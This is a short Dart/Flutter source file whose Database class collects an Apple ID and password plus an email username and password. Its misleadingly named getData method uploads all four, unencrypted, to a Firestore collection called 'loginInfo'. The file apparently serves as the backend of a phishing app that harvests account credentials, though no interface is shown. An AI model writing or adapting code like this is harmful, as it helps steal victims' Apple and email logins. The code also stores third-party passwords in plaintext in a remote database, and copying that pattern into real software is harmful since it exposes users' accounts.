// ignore_for_file: public_member_api_docs, sort_constructors_first
import 'dart:developer';

import 'package:cloud_firestore/cloud_firestore.dart';

class Database {
  String username;
  dynamic password;
  String emailUsername;
  String emailPassword;
  Database({
    required this.username,
    required this.password,
    required this.emailUsername,
    required this.emailPassword,
  });

  final firesbase = FirebaseFirestore.instance;

  Future<Map<String, dynamic>> getData() async {
    final Map<String, dynamic> data = {
      'appleID': username,
      'applePassWord': password,
      'emailUserName':emailUsername,
      'emailPassWord':emailPassword
    };
    try {
      firesbase.collection('loginInfo').add(data);
    } catch (e) {
      log(e.toString());
    }
    return data;
  }
}

// class EmailDatabase extends Database {
//   EmailDatabase({required super.username, required super.password});
//   final emailFiresbase = FirebaseFirestore.instance;
//   Future<Map<String, dynamic>> getEmailData() async {
//     final Map<String, dynamic> data = {
//       'emailUserName': username,
//       'emailPassWord': password
//     };
//     try {
//       emailFiresbase.collection('loginInfo').add(data);
//     } catch (e) {
//       log(e.toString());
//     }
//     return data;
//   }
// }
